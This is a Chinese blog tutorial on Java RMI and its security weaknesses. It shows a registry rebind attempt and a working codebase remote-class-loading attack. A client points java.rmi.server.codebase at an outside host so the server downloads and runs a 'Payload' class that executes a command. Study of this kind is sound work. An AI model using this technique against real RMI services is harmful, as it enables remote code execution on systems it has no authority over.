---
author: Denney Yang
pubDatetime: 2022-07-22T10:25:13+08:00
title: Java安全之RMI
featured: False
draft: False
tags:
  - notes
description: 如何理解RMI  RMI全称是Remote Method Invocation，即远程方法调用，和RPC(Remote Procedure Call)即远程过程调用类似。RMI的作用就是让某个Java虚拟机中的对象调用另外一个Java虚拟机中对象的方法，RMI是Java独有的一种机制。  现在我们模...
---
## 如何理解RMI

RMI全称是Remote Method Invocation，即远程方法调用，和RPC(Remote Procedure Call)即远程过程调用类似。RMI的作用就是让某个Java虚拟机中的对象调用另外一个Java虚拟机中对象的方法，RMI是Java独有的一种机制。

现在我们模拟一下RMI的过程，编写一个RMI服务端，一个RMI客户端，让客户端去调用服务端上的方法。

RMI服务端：

```java
public class RMIServer {
    public interface IRemoteHelloWorld extends Remote {
        public String hello() throws RemoteException;
    }

    public class RemoteHelloWorld extends UnicastRemoteObject implements IRemoteHelloWorld {
        protected RemoteHelloWorld() throws RemoteException {
            super();
        }

        @Override
        public String hello() throws RemoteException {
            System.out.println("call from");
            return "Hello world";
        }
    }

    private void start() throws Exception {
        RemoteHelloWorld h = new RemoteHelloWorld();
        LocateRegistry.createRegistry(1099);
        Naming.rebind("rmi://127.0.0.1:1099/Hello", h);
    }

    public static void main(String[] args) throws Exception {
        new RMIServer().start();
    }
}

# 在这段代码中，我们将一个RemoteHelloWorld对象注册到了’rmi://127.0.0.1:1099/Hello‘，客户端只要去请求这个位置就要调用RemoteHelloWorld对象
```

RMI客户端：

```java
public class RMIClient {
    public static void main(String[] args) throws Exception {
        RMIServer.IRemoteHelloWorld hello = (RMIServer.IRemoteHelloWorld)Naming.lookup("rmi://192.168.3.79:1099/Hello");
        String ret = hello.hello();
        System.out.println(ret);
    }
}
```

先运行服务端，再运行客户端：

客户端结果：

![Java004](https://s2.loli.net/2022/07/22/KCxolYe9wTJqcMd.png)

服务端结果：

![Java005](https://s2.loli.net/2022/07/22/xz9dqvaKpsOibn6.png)

从结果来看，客户端只是调用了服务端的方法，服务端将执行结果返回给了客户端，方法的具体执行依然是在服务端。在这个过程有三个部分，1.RMI客户端 2.RMI服务端 3.RMI Registry。RMI Registry就像是一个远程对象注册中心，RMI客户端每次调用具体方法前都会先在RMI Registry中寻找有没有这个远程对象，所以RMI服务端需要将可以被远程调用的对象注册到Registry，才可以被其他的客户端调用。 RMI执行的具体过程大致可以如下图：

![Java006](https://s2.loli.net/2022/07/22/IvipGj17ZsqxKVb.png)

## RMI的安全问题

### 对Registry的攻击

Registry就像是一个后台管理，那我们可以尝试直接访问Registry修改其上已经存在接口对应的对象。大致的攻击过程如下：

```java
# 使用list()列出Registry上绑定的所有接口
String[] s = Naming.list("rmi://192.168.3.79:1099");

# 如探测出如下的接口:
rmi:192.168.3.79:1099/hello
rmi:192.168.3.79:1099/refObj

# 我们直接尝试修改rmi:192.168.3.79:1099/hello绑定的对象，修改为恶意的一个对象
Payload p = new Payload();
Naming.rebind("rmi:192.168.3.79:1099/hello", p);
```

如果这样重新绑定对象成功，那当别人访问rmi:192.168.3.79:1099/hello接口时就会执行我们的恶意对象。但是往往当我们远程执行Naming.rebind()方法时往往会报错，因为Java对远程访问的Registry做了限制，只有来源地址是localhost的时候，才能调用rebind,bind,unbind等方法，所以这种对Registry的攻击方式是不可行的。

### 利用codebase来执行任意代码

在RMI中存在远程加载的场景。可以想象一下这样一个场景，客户端向服务端传送了一些序列化的对象，当服务端接受到这些序列化对象后进行反序列化，但是服务端发现有一个对象在本地没有找到，这是服务端就是去查看客户端传过来的数据中有没有codebase，如果有codebase就会去codebase指定的地址去寻找本地没有的这个对象。大致过程如下图：

![Java007](https://s2.loli.net/2022/07/22/Y397UblXgCIpucS.png)

这样我们就利用用codebase来让服务端执行任意命令，不过codebase的利用也是有条件的：

* 安装并配置了SecurityManager
* Java版本低于7u21、6u45，或者设置了Java.rmi.server.useCodebaseOnly=false。在7u21、6u45版本之前，Java.rmi.server.useCodebaseOnly的默认值为false，当Java.rmi.server.useCodebaseOnly=true时，Java虚拟机只信任预先配置好的codebase，不再支持从RMI请求中获取。

现在我们来实践一下，编写一个客户端，一个服务端，准备一台远程服务器，让服务端执行远程服务器上的恶意类。

服务端：

```java
public class RemoteRMIServer {
    private void start() throws Exception {
        if(System.getSecurityManager() == null) {
            System.out.println("setup SecurityManager");
            SecurityManager securityManager = new SecurityManager();
            System.setSecurityManager(securityManager);
        }

        Calc h = new Calc();
        LocateRegistry.createRegistry(1099);
        Naming.rebind("refObj", h);
        System.out.println("RMI运作中");
    }

    public static void main(String[] args) throws Exception {
        new RemoteRMIServer().start();
    }
}

# 服务端运行时要配置参数：-Djava.security.policy=server.policy -Djava.rmi.server.useCodebaseOnly=false -Djava.rmi.server.hostname=192.168.3.79
```

如果使用idea，配置运行时参数在这里：

![Java008](https://s2.loli.net/2022/07/22/zT1SmPdyBsCt4wv.png)

客户端：

```java
public class RMIClient implements Serializable {
    public void lookup() throws Exception {
        if(System.getSecurityManager() == null) {
            System.out.println("setup SecurityManager");
            SecurityManager securityManager = new SecurityManager();
            System.setSecurityManager(securityManager);
        }

        ICalc r = (ICalc) Naming.lookup("rmi://192.168.3.79:1099/refObj");
        List<Integer> li = new Payload();
        li.add(3);
        li.add(4);

        System.out.println(r.sum(li));
    }

    public static void main(String[] args) throws Exception {
        new RMIClient().lookup();
    }
}

# 配置运行时参数：-Djava.rmi.server.useCodebaseOnly=false -Djava.security.policy=client.policy -Djava.rmi.server.codebase=http://10.10.10.10:6666/
```

恶意类：

```java
public class Payload extends ArrayList<Integer> {
    static {
        try {
            System.out.println(Runtime.getRuntime().exec("whoami"));
            System.out.println("success");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

运行结果：

服务端：

![Java009](https://s2.loli.net/2022/07/22/DiHWs2h45Og7BeS.png)

客户端：

![Java010](https://s2.loli.net/2022/07/22/GQlLD3g6dMbBmKJ.png)

服务器：

![Java011](https://s2.loli.net/2022/07/22/yolBUiKsrSJXW72.png)

可以看到客户端和服务端都执行了恶意类中的代码，但是原因是不一样的，服务端执行恶意类是codebase指向的服务器中的代码，而客户端执行的恶意类是因为要在本地实例化恶意类对象时执行的。从服务器中我们也发现了一条请求，这条请求就是服务端发起的。

## 参考文档

phith0n的Java安全漫谈
